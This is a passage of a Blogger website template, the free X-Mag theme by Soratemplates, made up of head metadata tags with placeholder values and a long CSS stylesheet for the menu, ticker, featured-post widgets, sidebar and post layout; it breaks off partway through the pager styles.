# GENERA-INGRESOS
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE html>
<html b:version='2' class='v2' expr:dir='data:blog.languageDirection' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
  <head>
      <!-- [ Meta Tag SEO ] -->
<include expiration='7d' path='*.css'/>
<include expiration='7d' path='*.js'/>
<include expiration='3d' path='*.gif'/>
<include expiration='3d' path='*.jpeg'/>
<include expiration='3d' path='*.jpg'/>
<include expiration='3d' path='*.png'/>
<meta content='sat, 02 jun 2020 00:00:00 GMT' http-equiv='expires'/>
<meta charset='utf-8'/>
<meta content='width=device-width, initial-scale=1, maximum-scale=1' name='viewport'/>
    <b:include data='blog' name='all-head-content'/>
    <title>
  <b:if cond='data:blog.pageType == &quot;index&quot;'>
   <data:blog.pageTitle/>
  <b:else/>
   <b:if cond='data:blog.pageType != &quot;error_page&quot;'>
    <data:blog.pageName/> - <data:blog.title/>
   <b:else/>
    ERROR 404 - <data:blog.title/>
   </b:if>
  </b:if>
    </title>
    <!-- Description and Keywords (start) -->
    <b:if cond='data:blog.pageType == &quot;index&quot;'>
    <meta content='YOUR DESCRIPTION HERE' name='description'/>
    </b:if>
    <meta content='YOUR KEYWORDS HERE' name='keywords'/>
    <!-- Description and Keywords (end) -->
    <b:if cond='data:blog.pageType == &quot;item&quot;'>
        <meta expr:content='data:blog.pageName' property='og:title'/>
        <meta expr:content='data:blog.canonicalUrl' property='og:url'/>
        <meta content='article' property='og:type'/>
    </b:if>
    <b:if cond='data:blog.postImageUrl'>
        <meta expr:content='data:blog.postImageUrl' property='og:image'/>
    <b:else/>
    <b:if cond='data:blog.postImageThumbnailUrl'>
        <meta expr:content='data:blog.postImageThumbnailUrl' property='og:image'/>
    </b:if></b:if>
    <b:if cond='data:blog.metaDescription != &quot;&quot;'>
        <meta expr:content='data:blog.metaDescription' name='og:description'/>
    </b:if>
    <meta expr:content='data:blog.title' property='og:site_name'/>
    <meta expr:content='data:blog.homepageUrl' name='twitter:domain'/>
    <meta expr:content='data:blog.pageName' name='twitter:title'/>
    <b:if cond='data:blog.postImageUrl'>
      <meta content='summary_large_image' name='twitter:card'/>
      <meta expr:content='data:blog.postImageUrl' name='twitter:image'/>
    <b:else/>
      <meta content='summary' name='twitter:card'/>
      <b:if cond='data:blog.postImageThumbnailUrl'>
        <meta expr:content='data:blog.postImageThumbnailUrl' name='twitter:image'/>
      </b:if>
    </b:if>
    <meta expr:content='data:blog.pageName' name='twitter:title'/>
    <b:if cond='data:blog.metaDescription'>
      <meta expr:content='data:blog.metaDescription' name='twitter:description'/>
    </b:if>
<script type='application/ld+json'>{&quot;@context&quot;:&quot;http://schema.org&quot;,&quot;@type&quot;:&quot;WebSite&quot;,&quot;name&quot;:&quot;<data:view.title.escaped/>&quot;,&quot;url&quot;:&quot;<data:view.url.canonical/>&quot;,&quot;potentialAction&quot;:{&quot;@type&quot;:&quot;SearchAction&quot;,&quot;target&quot;:&quot;<data:view.url.canonical/>search?q={search_term_string}&quot;,&quot;query-input&quot;:&quot;required name=search_term_string&quot;}}</script>
    <!-- Social Media meta tag need customer customization -->
    <meta content='Facebook App ID here' property='fb:app_id'/>
    <meta content='Facebook Admin ID here' property='fb:admins'/>
    <meta content='@username' name='twitter:site'/>
    <meta content='@username' name='twitter:creator'/>     
  <b:skin><![CDATA[/* 
-----------------------------------------------
Blogger Template Style
Name:        X-Mag
License:     Free Version
Version:     3.0
Author:      Soratemplates
Author Url:  https://www.soratemplates.com/
----------------------------------------------- */
/* Variable definitions
-----------------------
<Variable name="body.background" description="Background" type="background" color="#fff" default="$(color) url() repeat fixed top left" value="$(color) url() repeat fixed top left"/>
<Group description="Main Settings" selector="body">
<Variable name="maincolor" description="Primary Color" type="color" default="#fb4834"  value="#fb4834"/>
<Variable name="darkcolor" description="Primary Text Color" type="color" default="#222"  value="#222222"/>
</Group>
<Group description="Menu Background" selector="body">
<Variable name="menubg" description="Menu Background Color" type="color" default="#2c3242"  value="#2c3242"/>
</Group>
-----------------------
*/
/*****************************************
reset.css
******************************************/
html, body, .section, .widget, div, span, applet, object, iframe,
h1, h2, h3, h4, h5, h6, p, blockquote, pre,
a, abbr, acronym, address, big, cite, code,
del, dfn, em, font, img, ins, kbd, q, s, samp,
small, strike, strong, sub, sup, tt, var,
dl, dt, dd, ol, ul, li,
fieldset, form, label, legend,
table, caption, tbody, tfoot, thead, tr, th, td, figure {    margin: 0;    padding: 0;}
html {   overflow-x: hidden;}
a {text-decoration:none;color:#000;}
article,aside,details,figcaption,figure,
footer,header,hgroup,menu,nav,section {     display:block;}
table {    border-collapse: separate;    border-spacing: 0;}
caption, th, td {    text-align: left;    font-weight: normal;}
blockquote:before, blockquote:after,
q:before, q:after {    content: "";}
.quickedit, .home-link{display:none;}
blockquote, q {    quotes: "" "";}
sup{    vertical-align: super;    font-size:smaller;}
code{    font-family: 'Courier New', Courier, monospace;    font-size:12px;    color:#272727;}
::selection {background:transparent; text-shadow:#000 0 0 2px;}
::-moz-selection {background:transparent; text-shadow:#000 0 0 2px;}
::-webkit-selection {background:transparent; text-shadow:#000 0 0 2px;}
::-o-selection {background:transparent; text-shadow:#000 0 0 2px;}
a img{	border: none;}
ol, ul { padding:0;  margin:0;  text-align: left;  }
ol li { list-style-type: decimal;  padding:0 0 5px;  }
ul li { list-style-type: disc;  padding: 0 0 5px;  }
ul ul, ol ol { padding: 0; }
#navbar-iframe, .navbar {   height:0px;   visibility:hidden;   display:none   }
.feed-links, .Attribution, .post-footer-line.post-footer-line-1, .post-footer-line.post-footer-line-2 , .post-footer-line.post-footer-line-3 {
display: none;
}
.CSS_LIGHTBOX{z-index:999999!important}.CSS_LIGHTBOX_ATTRIBUTION_INDEX_CONTAINER .CSS_HCONT_CHILDREN_HOLDER > .CSS_LAYOUT_COMPONENT.CSS_HCONT_CHILD:first-child > .CSS_LAYOUT_COMPONENT{opacity:0}
abbr.published.timeago {
    text-decoration: none;
}
.item-control {
display: none !important;
}
h2.date-header, h4.date-header {display:none;margin:1.5em 0 .5em}
.error_page .status-msg-wrap {
    display: none;
}
blockquote {
padding: 8px;
background-color: #faebbc;
border-top: 1px solid #e1cc89;
border-bottom: 1px solid #e1cc89;
margin: 5px;
background-image: url(http://1.bp.blogspot.com/-siy6EKYCLtM/U6X4AdKrr0I/AAAAAAAANDs/HCjRvuedDro/s1600/openquote1.gif);
background-position: top left;
background-repeat: no-repeat;
text-indent: 23px;
}
blockquote p{
display: block;
background-image: url(http://3.bp.blogspot.com/-UjppXQI-ww0/U6X4IpheNiI/AAAAAAAAND0/PJhRvvhAWGU/s1600/closequote1.gif);
background-repeat: no-repeat;
background-position: bottom right;
}
img {
    max-width: 100%;
    vertical-align: middle;
    border: 0;
}
.widget iframe, .widget img {
    max-width: 100%;
}
* {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box
}
/*****************************************
Custom css starts
******************************************/
body {
color: #2e2e2e;
font-family:'Roboto',sans-serif;
font-size: 14px;
font-weight: normal;
line-height: 21px;
background:$(body.background);
}
/* ######## Wrapper Css ######################### */
#body-wrapper{max-width:100%;margin:0 auto;background-color:#FFF;box-shadow:0 0 5px RGBA(0, 0, 0, 0.2)}
.body-row{width:1063px}
#content-wrapper {
margin: 0 auto;
padding: 20px 0 40px;
overflow: hidden;
}
#main-wrapper {
float: left;
width: 67%;
max-width: 750px;
}
#sidebar-wrapper {
float: right;
width: 30%;
max-width: 330px;
}
.post-body a:visited{color:#FF0000}

/* ######## Ticker Css ######################### */
.ticker-wrap {
   display: block;
    text-align: center;
    margin: 0 auto;
    padding: 0 20px 0 20px;
    background: $darkcolor;
position:relative;
    min-height: 45px;
}
.ticker-wrap-wrapper {
margin:0 auto;
position:relative;
}
.ticker-wrap .title {
   position: absolute;
left:0;
top:10px;
    height: 25px;
    font-size: 15px;
    color: #222;
    line-height: 25px;
    font-weight: bold;
    overflow: hidden;
    padding: 0 10px;
    border-radius: 2px;
    background: #fff;
 text-transform:uppercase;
}
.ticker-wrap .title .fa {
    margin-right: 10px;
    background: #fff;
    padding: 5px 6px;
    border-radius: 100%;
    color: #00c8d7;
}
.ticker-wrap>span {
    display: inline-block;
    padding: 0;
    font: 700 13px 'roboto', sans-serif
}
.ticker-wrap>span>a {
    color: #fff;
    text-decoration: none
}
#ticker {
    height: 45px;
    overflow: hidden;
    text-align: left;
max-width:720px;
padding-left:100px;
}
#ticker ul {
    padding: 0;
    margin: 0;
    list-style: none
}
#ticker ul li {
    height: 45px;
    white-space: nowrap;
list-style:none;
}
#ticker ul li h3 {
    margin: 0;
    font: 700 16px 'roboto', sans-serif;
line-height:45px;
}
#ticker ul li h3 a {
    color: #fff;
    text-decoration: none;
    line-height: 25px!important
}

.top-bar-social {
    height: 45px;
    position: absolute;
    right: 0;
    top: 0;
}
.top-bar-social li {
display: inline;
padding: 0;
float: left;
margin-right: 5px;
;
}
.top-bar-social .widget ul {
padding: 0;
}
.top-bar-social .LinkList ul {
text-align: center;
margin: 0;
}
.top-bar-social #social a {
display: block;
width: 30px;
height: 45px;
line-height:45px;
font-size: 15px;
color: #eeeeee;
transition: background 0.3s linear;
-moz-transition: background 0.3s linear;
-webkit-transition: background 0.3s linear;
-o-transition: background 0.3s linear;
}
.top-bar-social #social a:before {
display: inline-block;
font: normal normal normal 22px/1 FontAwesome;
font-size: inherit;
font-style: normal;
font-weight: 400;
-webkit-font-smoothing: antialiased;
-moz-osx-font-smoothing: grayscale;
}
.top-bar-social .bloglovin:before{content:"\f004"}
.top-bar-social .facebook:before{content:"\f09a"}
.top-bar-social .twitter:before{content:"\f099"}
.top-bar-social .gplus:before{content:"\f0d5"}
.top-bar-social .rss:before{content:"\f09e"}
.top-bar-social .youtube:before{content:"\f167"}
.top-bar-social .skype:before{content:"\f17e"}
.top-bar-social .stumbleupon:before{content:"\f1a4"}
.top-bar-social .tumblr:before{content:"\f173"}
.top-bar-social .vine:before{content:"\f1ca"}
.top-bar-social .stack-overflow:before{content:"\f16c"}
.top-bar-social .linkedin:before{content:"\f0e1"}
.top-bar-social .dribbble:before{content:"\f17d"}
.top-bar-social .soundcloud:before{content:"\f1be"}
.top-bar-social .behance:before{content:"\f1b4"}
.top-bar-social .digg:before{content:"\f1a6"}
.top-bar-social .instagram:before{content:"\f16d"}
.top-bar-social .pinterest:before{content:"\f0d2"}
.top-bar-social .delicious:before{content:"\f1a5"}
.top-bar-social .codepen:before{content:"\f1cb"}
.top-bar-social ul#social a:hover {
opacity: 1;
}

.custom-widget li{
    padding: 0px;
    overflow: hidden;
    margin: 8px 0 0;
}
.custom-widget li:first-child{padding:0;margin:0;border:0}
.custom-widget .post-image-link{position:relative;width:82px;height:82px;float:left;overflow:hidden;display:block;vertical-align:middle;margin:0 12px 0 0}
.custom-widget .post-info{overflow:hidden}
.custom-widget h2.post-title {
    font-size: 14px;
    line-height: 1.4em;
    font-weight: 500;
}
.custom-widget h2.post-title a{color:#fff}
.widget ul{margin:0px;padding:0px}


/* ######## Header Css ######################### */
.header-wrap {
background:#fff;
}
#header-wrappers {
color: #fff;
padding: 30px 0;
margin:0 auto;
}
#header-inner {
background-position: left;
background-repeat: no;
}
.headerleft img {
height: auto;
max-height: 100%;
margin:0;
max-width:230px;
}
.headerleft h1,
.headerleft h1 a,
.headerleft h1 a:hover,
.headerleft h1 a:visited {
font-family: 'Bungee Inline', cursive;
color: $darkcolor;
font-size: 52px;
font-weight:normal;
line-height: 1.2em;
margin: 0;
padding: 0 0 5px;
text-decoration: none;
text-transform: uppercase;
    letter-spacing: 1px;
}
.headerleft h3 {
font-weight: 400;
margin: 0;
padding: 0;
}
.headerleft .description {
color: #666;
    margin: 0;
    padding: 0 0 10px;
    text-transform: capitalize;
    text-align: center;
    text-indent: 0;
    letter-spacing: 1px;
}
.headerleft {
float: left;
margin: 0;
padding: 0;
width: auto;
}
.headerright {
float: right;
margin: 0;
padding: 1px 0 0;
width: 730px;
}
.headerleft .description span {
    border-top: 1px solid rgba(241, 241, 241, 0.25);
    padding: 5px 0 0;
}
/* ######## Navigation Menu Css ######################### */
.selectnav {
display:none;
}
.tm-menu {
    font-weight: 400;
    margin: 0 auto;
    height:50px;
}
ul#nav1 {
    list-style: none;
    margin: 0;
    padding: 0;
}
#menu .widget {
    display: none;
}
#menu {
    height: 50px;
    position: relative;
    text-align: center;
    z-index: 15;
margin:0 auto;
    background: $menubg;
padding-right:50px;
}
.menu-wrap {
margin:0 auto;
position: relative;
}
#menu ul > li {
    position: relative;
    vertical-align: middle;
    display: inline-block;
    padding: 0;
    margin: 0;
}
#menu ul > li:first-child {
background:$maincolor;
}
#menu ul > li > ul > li:first-child {
background:transparent;
}
#menu ul > li:hover > a {
   
}
#menu ul > li > a {
    color: #fff;
    font-size: 14px;
    font-weight: 600;
    line-height: 50px;
    display: inline-block;
    text-transform: uppercase;
    text-decoration: none;
    letter-spacing: 1px;
    margin: 0;
    padding: 0 12px;
}

#menu ul > li > ul > li:first-child > a {
    padding-left: 12px
}
#menu ul > li > ul {
    position: absolute;
    background: #4d4d4d;
    top: 100%;
    left: 0;
    min-width: 180px;
    padding: 0;
    z-index: 99;
    margin-top: 0;
    visibility: hidden;
    opacity: 0;
    -webkit-transform: translateY(10px);
    -moz-transform: translateY(10px);
    transform: translateY(10px)
}
#menu ul > li > ul > li > ul {
    position: absolute;
    top: 0;
    left: 180px;
    width: 180px;
    background: #5d5d5d;
    z-index: 99;
    margin-top: 0;
    margin-left: 0;
    padding: 0;
    border-left: 1px solid #6d6d6d;
    visibility: hidden;
    opacity: 0;
    -webkit-transform: translateY(10px);
    -moz-transform: translateY(10px);
    transform: translateY(10px)
}
#menu ul > li > ul > li {
    display: block;
    float: none;
    text-align: left;
    position: relative;
border-bottom: 1px solid;
    border-top: none;
    border-color: #8d8d8d;
}
#menu ul > li > ul > li:last-child {
    border: 0;
}
#menu ul > li:hover {
    background-color: $darkcolor
}
#menu ul > li > ul > li a {
    font-size: 11px;
    display: block;
    color: #fff;
    line-height: 35px;
    text-transform: uppercase;
    text-decoration: none;
    margin: 0;
    padding: 0 12px;
    border-right: 0;
    border: 0
}
#menu ul > li.parent > a:after {
    content: '\f107';
    font-family: FontAwesome;
    float: right;
    margin-left: 5px
}
#menu ul > li:hover > ul,
#menu ul > li > ul > li:hover > ul {
    opacity: 1;
    visibility: visible;
    -webkit-transform: translateY(0);
    -moz-transform: translateY(0);
    transform: translateY(0)
}
#menu ul > li > ul > li.parent > a:after {
    content: '\f105';
    float: right
}
#menu ul ul {

}
.ty-ran-yard {
  position: absolute;
    right: 0;
    top: 0;
    z-index: 99;
}
.ty-ran-yard span {
    list-style: none;
}
.ty-ran-yard a.ran-sym {
    background-color: $darkcolor;
    cursor: pointer;
    display: block;
    height: 50px;
    text-align: center;
    position: relative;
    right: 0;
    top: 0;
    width: 50px;
    border-radius: 0;
    box-sizing: border-box;
}
.ty-ran-yard a.ran-sym:hover {
background-color:#6d6d6d;
}
.ty-ran-yard a.ran-sym:before {
    color: #fff;
    content: '\f074';
    font-family: FontAwesome;
    font-size: 16px;
    text-rendering: auto;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    line-height: 50px;
}


/* ######## Featured Widget Css ######################### */
.feat-main-wrapper {
  display: flex;
  margin:10px auto;
}
.tyard-wrapper {
  width:75%;
float:left;
max-width:780px;
overflow:hidden;
}
.tyard h2 {
    display: none;
    visibility: hidden;
}
.preload {
opacity:0;
transition: all .3s ease;
    -webkit-transition: all .3s ease;
    -moz-transition: all .3s ease;
    -o-transition: all .3s ease;
}
.comload {
opacity:1;
transition: all .3s ease;
    -webkit-transition: all .3s ease;
    -moz-transition: all .3s ease;
    -o-transition: all .3s ease;
}
.tyard .ty-first {
    width: 75%;
    position: relative;
    float: left;
    padding-right: 1px;
    box-sizing: border-box;
    overflow: hidden;
}
.tyard .ty-feat-image {
    width: 100%;
    position: relative;
    overflow: hidden;
}
.templatesyard .ty-first .tyard-thumb {
    position: relative;
    width: 100%;
    height: 135px;
}
.tyard-thumb {
    overflow: hidden;
}
.templatesyard .ty-img {
    width: 100%;
    height: 200px;
    position: relative;
    display: block;
    transition: all .3s ease-in-out;
}
.tyard .ty-first .tyard-thumb, .tyard .ty-img {
    height: 407px;
}
.ty-first .ty-img:after {
    content: no-close-quote;
    position: absolute;
    left: 0;
    bottom: 0;
    width: 100%;
    height: 230px;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzE5MjMyZCIgc3RvcC1vcGFjaXR5PSIwIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiMxOTIzMmQiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+) repeat-x;
    opacity: .8;
}
.templatesyard .ty-feat .ty-rest .yard-img:after {
    content: no-close-quote;
    position: absolute;
    left: 0;
    bottom: 0;
    width: 100%;
    height: 110px;
    background: url(data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiA/Pgo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwJSIgdmlld0JveD0iMCAwIDEgMSIgcHJlc2VydmVBc3BlY3RSYXRpbz0ibm9uZSI+CiAgPGxpbmVhckdyYWRpZW50IGlkPSJncmFkLXVjZ2ctZ2VuZXJhdGVkIiBncmFkaWVudFVuaXRzPSJ1c2VyU3BhY2VPblVzZSIgeDE9IjAlIiB5MT0iMCUiIHgyPSIwJSIgeTI9IjEwMCUiPgogICAgPHN0b3Agb2Zmc2V0PSIwJSIgc3RvcC1jb2xvcj0iIzE5MjMyZCIgc3RvcC1vcGFjaXR5PSIwIi8+CiAgICA8c3RvcCBvZmZzZXQ9IjEwMCUiIHN0b3AtY29sb3I9IiMxOTIzMmQiIHN0b3Atb3BhY2l0eT0iMSIvPgogIDwvbGluZWFyR3JhZGllbnQ+CiAgPHJlY3QgeD0iMCIgeT0iMCIgd2lkdGg9IjEiIGhlaWdodD0iMSIgZmlsbD0idXJsKCNncmFkLXVjZ2ctZ2VuZXJhdGVkKSIgLz4KPC9zdmc+) repeat-x;
    opacity: .8;
}
.templatesyard .ty-feat .ty-last .yard-img:after {
height:230px;
}
.tyard .yard-label {
    z-index: 2;
}
.tyard .yard-label {
    background: $maincolor;
    color: #fff;
    text-transform: uppercase;
    height: 20px;
    line-height: 20px;
    display: inline-block;
    padding: 0 6px;
    font-size: 11px;
    font-weight: 400;
margin-bottom: 8px;
}
.tyard .yard-label a {
color:#fff;
}
.tyard .tyard-thumb .item-cmm {
     position: absolute;
    top: 0;
    right: 0;
    z-index: 2;
    color: #fff;
    text-transform: uppercase;
    height: 20px;
    line-height: 20px;
    display: inline-block;
    padding: 0 6px;
    font-size: 11px;
    font-weight: 400;
    background: $maincolor;
}
.tyard .tyard-thumb .item-cmm:before {
    content: "\f086";
    margin-right: 5px;
    font-family: FontAwesome;
    font-style: normal;
    font-weight: normal;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}
.tyard .ty-first .ty-con-yard, .column .ty-first .ty-con-yard {
    position: absolute;
    bottom: 0;
    width: 100%;
    z-index: 2;
    padding: 15px;
    box-sizing: border-box;
text-align:center;
}
.tyard .ty-first .ty-con-yard .tyard-title a, .column .ty-first .ty-con-yard .tyard-title a, .tyard .ty-last .yard-tent-ty .tyard-title a {
    display: block;
    font-size: 24px;
    color: #fff;
    font-weight: 400;
    line-height: 1.4em;
    margin-bottom: 5px;
}
.ty-con-yard .yard-auth-ty, .ty-con-yard .ty-time {
    color: #ccc;
}
.recent-summary {
    display: block;
    color: #ccc;
    padding: 10px 0;
}
.tyard .ty-feat .ty-rest-wrap {
display:block;
    position: relative;
    box-sizing: border-box;
    overflow: hidden;
}

.tyard .ty-feat .ty-last {
width: 25%;
    position: relative;
    float: left;
    padding: 0;
    box-sizing: border-box;
    overflow: hidden;
}
.tyard .ty-feat .ty-rest {
   overflow: hidden;
    display: block;
     padding: 0;
    position: relative;
}
.tyard .ty-feat .ty-rest-wrap:nth-child(3) .ty-rest,.tyard .ty-feat .ty-rest-wrap:nth-child(4) .ty-rest {
    margin-top: 1px;
}
.tyard .ty-feat .ty-rest-wrap:nth-child(3),.tyard .ty-feat .ty-rest-wrap:nth-child(5) {
   padding-right:0;
}
.templatesyard .ty-feat .ty-rest .tyard-thumb {
    width: 100%;
    height: 135px;
    vertical-align: middle;
}
.templatesyard .ty-feat .ty-rest .yard-img {
    width: 100%;
    height: 135px;
    position: relative;
    display: block;
    transition: all .3s ease-in-out;
}
.templatesyard .ty-feat .ty-last .yard-img, .templatesyard .ty-feat .ty-last .tyard-thumb {
height:407px;
}
.tyimg-lay {
    position: absolute;
    left: 0;
    top: 0;
    z-index: 1;
    width: 100%;
    height: 100%;
    background-color: rgba(40,35,40,0.05);
}
.templatesyard .ty-feat .ty-rest .yard-tent-ty {
   position: absolute;
    bottom: 0;
    width: 100%;
    z-index: 2;
    padding: 15px;
bottom:0;
text-align:center;
    box-sizing: border-box;
transition: all .4s ease-in-out;
}
.tyard .ty-rest .yard-tent-ty .tyard-title {
    overflow: hidden;
    line-height: 0;
    margin: 0 0 2px;
    padding: 0;
}
.tyard .ty-rest-wrap .ty-rest .yard-tent-ty .tyard-title a {
    color: #fff;
    font-weight: bold;
    font-size: 13px;
letter-spacing:0.2px;
    line-height: 18px;
}
.tyard .ty-first:hover .ty-img, .tyard .ty-rest:hover .yard-img {
transform: scale(1.1) rotate(-1deg);
    transition: all .3s ease-in-out;
}
.tyard .ty-first:hover .tyimg-lay, .tyard .ty-rest:hover .tyimg-lay {
    background-color: rgba(0,0,0,.2);
    transition: all .3s ease-in-out;
}
ul.roma-widget {
    padding: 0;
    margin: 0;
}
.roma-widget li:first-child {
    padding-top: 0;
    border-top: 0;
}
.roma-widget li {
    overflow: hidden;
    padding: 10px 0;
list-style: none;
    border-bottom: 1px solid #3c455a;
}
.roma-widget .wid-thumb {
    width: 80px;
    height: 60px;
    float: left;
    margin-right: 10px;
    overflow: hidden;
}
.roma-widget .mag-thumb {
    display: block;
    width: 80px;
    height: 60px;
    transition: all .3s ease-out!important;
    -webkit-transition: all .3s ease-out!important;
    -moz-transition: all .3s ease-out!important;
    -o-transition: all .3s ease-out!important;
}
.roma-widget .wrp-titulo {
    font: normal normal 13px;
    margin: 0 0 5px;
    overflow: hidden;
line-height: 18px;
}
.roma-widget .wrp-titulo a {
    color: #fff;
    font-weight: bold;
    font-size: 13px;
letter-spacing:0.2px;
    line-height: 18px;
}
.img-overlay {
    position: absolute;
    left: 0;
    top: 0;
    z-index: 1;
    width: 100%;
    height: 100%;
    background-color: rgba(40,35,40,0.05);
}
.tyard-ran {
    background: #2C3242;
    width: 30%;
    display: block;
    overflow: hidden;
    padding-left: 1px;
    box-sizing: border-box;
}
.tyard-ran .randoom {
    background: #2C3242;
    min-height: 407px;
    max-height: 407px;
    overflow-y: auto;
}
.tyard-ran .randoom .widget-content {
    padding: 15px;
    box-sizing: border-box;
}
.tyard-ran h2.title {
    background: #485169;
    padding: 0px 15px;
    line-height: 40px;
    margin: 0px 0 10px;
    text-transform: uppercase;
    font-weight: 800;
    font-size: 18px;
    color: #FFF;
}
.ty-con-yard .yard-auth-ty, .ty-con-yard .ty-time {
    color: #ccc;
}
.yard-auth-ty, .ty-time {
    color: #bdbdbd;
    font-size: 12px;
    font-weight: 400;
}
.yard-auth-ty {
    margin-right: 10px;
}
.yard-auth-ty::before {
    content: '\f007';
    font-family: fontawesome;
    color: #bbb;
    margin-right: 5px;
}
.ty-time:before {
    content: '\f133';
    font-family: fontawesome;
    color: #bbb;
    margin-right: 5px;
}
/* ######## Sidebar Css ######################### */
.sidebar .widget {
margin-bottom: 20px;
position: relative;
}
.sidebar h2 {
padding: 6px 8px;
    margin-bottom: -2px;
    display: inline-block;
    background: $maincolor;
    color: #fff;
    font-size: 16px;
    font-weight: 700;
    text-transform: uppercase;
position:relative;
}
.sidebar .widget .widget-title {
    margin: 0 0 10px 0;
    padding: 0;
    position: relative;
    border-bottom: 2px solid $maincolor;
    transition: all .5s ease-out;
}
.sidebar h2:after {
    content: "";
    width: 0;
    height: 0;
    position: absolute;
    top: 0;
    right: -14px;
    border-left: 0;
    border-right: 14px solid transparent;
    border-bottom: 34px solid $maincolor;
}
.sidebar ul,.sidebar li{
list-style-type:none;
margin:0;
padding:0;
}
.sidebar .widget-content {
    padding: 10px 0;
}
/* ######## Post Css ######################### */
article {
    padding: 0;
}
.post-outer {
    padding: 0;
}
.index .post-outer, .archive .post-outer {
margin: 0 0 20px 0;
 padding: 0 0 20px 0;
border-bottom: 1px solid rgba(0,0,0,0.14);
}
.post {
    display: block;
    overflow: hidden;
    word-wrap: break-word;
background: #ffffff;
}
.post h2 {
margin-bottom: 12px;
line-height: 30px;
    font-size: 20px;
    font-weight: 700;
}
.post h2 a {
color: #000;
letter-spacing: 1px;
}
.post h2 {
    margin: 0 0 10px;
    padding: 0;
}
.post-head h1 {
    color: #000;
    font-size: 28px;
    font-weight: 400;
    line-height: 44px;
}

.retitle h2 {
    line-height: 1.4em;
    margin: 0 0 8px;
    display: block;
}
.post-body {
margin: 0px;
padding:10px;
font-size: 14px;
line-height: 26px;
box-sizing:border-box;
}
.post-home-image {
    float: left;
    width: 300px;
    height: 220px;
    margin-right: 20px;
position:relative;
}
.post-home-image .post-thumb {
    width: 100%;
    height: 220px;
    position: relative;
    display: block;
    overflow: hidden;
}
.post-home-image .post-thumb img {
    width: 100%;
    height: 220px;
    display: block;
    padding: 3px;
    box-sizing: border-box;
    border: 1px solid #e6e6e6;
object-fit:cover;
    transition: all .3s ease-out!important;
    -webkit-transition: all .3s ease-out!important;
    -moz-transition: all .3s ease-out!important;
    -o-transition: all .3s ease-out!important;
}
.index .post-home-image .post-labels, .archive .post-home-image .post-labels {
    position: absolute;
    top: 10px;
    left: 10px;
    padding: 8px 12px 6px;
    background: $maincolor;
    color: #fff;
    font-size: 12px;
    text-transform: uppercase;
    display: inline-block;
    z-index: 9;
}
.index .post-home-image .post-labels a, .archive .post-home-image .post-labels a {
    color: #fff;
}
.date-header {
    color: #bdbdbd;
    display: block;
    font-size: 12px;
    font-weight: 400;
    line-height: 1.3em;
    margin: 0!important;
    padding: 0;
}
.date-header a {
    color: #bdbdbd;
}
.post-header {
    padding: 10px;
}
#meta-post {
    border: 1px solid #f0f0f0;
    border-width: 1px 0;
    padding: 5px 0;
font-size: 13px;
}
#meta-post i {
    margin-left: 8px;
color:#999;
}
#meta-post a {
color:#999;
}
.post-meta {
    color: #bdbdbd;
    display: block;
    font-size: 13px;
    font-weight: 400;
    line-height: 21px;
 margin: 10px 0 0;
    padding: 0;
}
.post-meta a, .post-meta i {
    color: #CBCBCB;
}
.post-timestamp {
    margin-left: 5px;
}
.label-head {
    margin-left: 5px;
}
.label-head a {
    padding-left: 2px;
}
.resumo {
    margin-top: 10px;
    color: #111;
}
.resumo span {
    display: block;
    margin-bottom: 8px;
font-size: 15.4px;
    line-height: 1.5;
text-align:justify;
}
.date-header .read-more {
    background: $darkcolor;
    padding: 5px 12px !important;
    display: inline-block;
    vertical-align: middle;
    margin: 10px 0 0;
    font-size: 12px;
   text-transform: capitalize;
    border-radius: 2px;
    color: #f7f7f7;
    font-weight: bold;
white-space: nowrap;
}
.read-more:hover {
    background: $maincolor;
color:#fff;
}
.post-body img {
max-width: 100%;
padding: 10px 0;
position: relative;
margin:0 auto;
}
.post h3 {
font-size: 18px;
margin-top: 20px;
margin-bottom: 10px;
line-height: 1.1;
}
.second-meta {
    display: none;
}
.comment-link {
    white-space: normal;
}
#blog-pager {
    clear: both;
    text-align: center;
    margin: 0;
}
.index .blog-pager,
.index #blog-pager {
    display: block
}
.index .blog-pager,
.index #blog-pager,
.archive .blog-pager,
.archive #blog-pager {
    -webkit-border-radius: 0;
    -moz-border-radius: 0;
    border-radius: 0;
    padding: 15px 0 5px;
    text-align: center;
}
.showpageNum a,
.showpage a,
#blog-pager-newer-link a,
#blog-pager-older-link a {
    color: #fff;
    background-color: $darkcolor;
    font-size: 14px;
    font-weight: 400;
    line-height: 24px;
    margin-right: 5px;
    overflow: hidden;
    padding: 4px 10px;
    text-decoration: none
}
.showpageNum a:hover,
.showpage a:hover,
#blog-pager-newer-link a:hover,
#blog-pager-older-link a:hover {
    decoration: none;
    background-color: $maincolor
}
.showpageOf {
    display: none;
    font-size: 0
}
.showpagePoint {
    color: #fff;
    background-color: $maincolor;
    font-size: 14px;
    font-weight: 400;
